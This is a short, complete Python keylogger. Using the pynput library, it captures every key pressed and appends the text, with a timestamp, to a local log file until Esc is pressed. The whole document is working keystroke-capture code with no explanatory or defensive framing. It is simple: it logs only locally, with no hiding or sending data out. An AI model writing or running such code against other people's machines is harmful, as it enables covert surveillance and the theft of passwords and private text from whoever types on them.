from pynput.keyboard import Listener,Key
import sys
import datetime

with open('Python\\log.txt','a') as f:
    f.write(str(datetime.datetime.now())+'\n')

def on_press(key):
    if key == Key.esc:
        sys.exit()
    letter = str(key).replace("'",'')
    write_on_file(letter)

def write_on_file(letter):
    key_list = ['Key.enter','Key.space', 'Key.backspace']
    with open('Python\\log.txt','a') as f:
        if letter in key_list:
            if letter == 'Key.enter':
                letter = '<RETURN>\n'
            if letter == 'Key.space':
                letter =' '
            if letter == 'Key.backspace':
                letter = ' <- '
        else:
            if letter.startswith('Key.') or letter.startswith('\\'):
                letter = ''
        f.write(letter)

with Listener(on_press = on_press) as listener:
    listener.join()